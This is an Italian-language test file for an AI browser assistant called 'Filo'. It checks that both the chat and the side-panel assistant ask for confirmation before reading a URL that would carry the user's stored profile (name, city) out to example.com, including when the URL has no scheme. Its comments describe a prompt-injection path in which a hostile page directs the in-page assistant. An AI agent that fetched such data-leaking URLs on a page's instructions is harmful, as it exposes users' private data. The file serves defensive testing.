// #553 giro 3 — la lettura di una pagina esce dai dati anche dall'Aiuto laterale,
// e su quella strada il freno non c'è.
//
// Il giro 1 aveva chiuso questa porta sulla chat: un indirizzo che porta fuori
// dei dati fa chiedere conferma, comunque si chiami il campo. Il giro 2 ha
// aggiunto la stessa lettura all'assistente laterale, che vive DENTRO la pagina
// web ed è il posto dove una pagina ostile detta le sue istruzioni: lì la
// richiesta parte da sola.

import { test, expect } from '../../fixtures/electron.mjs';

const NEWTAB = 'filo://newtab/';
const ESFILTRA = 'https://example.com/collect?d=Mario_Rossi_Bologna';

async function preparaMemoriaERete(app) {
  await app.evaluate(async () => {
    await globalThis.SN_FILO_MEMORY.setMemory({
      PROFILO: 'Si chiama Mario Rossi, vive a Bologna.',
      PREFERENZE: 'Tema scuro.',
    });
    globalThis.__rete = [];
    const orig = globalThis.fetch;
    globalThis.__ripristinaRete = () => { globalThis.fetch = orig; };
    globalThis.fetch = async (u) => {
      globalThis.__rete.push(String(u));
      return new Response('<html><body><main><p>ok</p></main></body></html>', {
        status: 200, headers: { 'content-type': 'text/html; charset=utf-8' },
      });
    };
  });
}

test.afterEach(async ({ app }) => {
  await app.evaluate(() => { try { globalThis.__ripristinaRete?.(); } catch (_) {} });
});

test('anche l\'assistente dentro la pagina deve fermarsi su un indirizzo che porta fuori i dati', async ({ app, openTab }) => {
  test.setTimeout(60_000);
  await openTab(NEWTAB);
  await preparaMemoriaERete(app);

  // La chat: il freno c'è, la richiesta non parte.
  const chat = await app.evaluate((_e, u) => globalThis.SN_EXECUTE_FILO_ACTION({ type: 'LEGGI_PAGINA', url: u }), ESFILTRA);
  expect(chat.needsConfirm).toBe(2);
  expect(await app.evaluate(() => globalThis.__rete.slice())).toEqual([]);

  // L'assistente laterale: stessa lettura, stesso indirizzo, chiesta da una
  // pagina web qualunque — cioè dall'origine da cui arriva l'iniezione.
  const aiuto = await app.evaluate(
    (_e, u) => globalThis.SN_HANDLE_MESSAGE({ type: 'read_page', url: u }, { url: 'https://ostile.example/articolo' }),
    ESFILTRA,
  );
  const usciti = await app.evaluate(() => globalThis.__rete.slice());
  expect(aiuto).toBeTruthy();
  // La richiesta NON deve essere partita senza che l'utente abbia visto l'indirizzo.
  expect(usciti).toEqual([]);
});

test('lo stesso indirizzo senza «https://» davanti non deve saltare il freno', async ({ app, openTab }) => {
  test.setTimeout(60_000);
  await openTab(NEWTAB);
  await preparaMemoriaERete(app);

  // Filo completa da solo lo schema mancante e la richiesta parte lo stesso:
  // il freno deve guardare l'indirizzo che verrà davvero contattato.
  const r = await app.evaluate(
    (_e, u) => globalThis.SN_EXECUTE_FILO_ACTION({ type: 'LEGGI_PAGINA', url: u }),
    'example.com/collect?d=Mario_Rossi_Bologna',
  );
  expect(r.needsConfirm).toBe(2);
  expect(await app.evaluate(() => globalThis.__rete.slice())).toEqual([]);
});
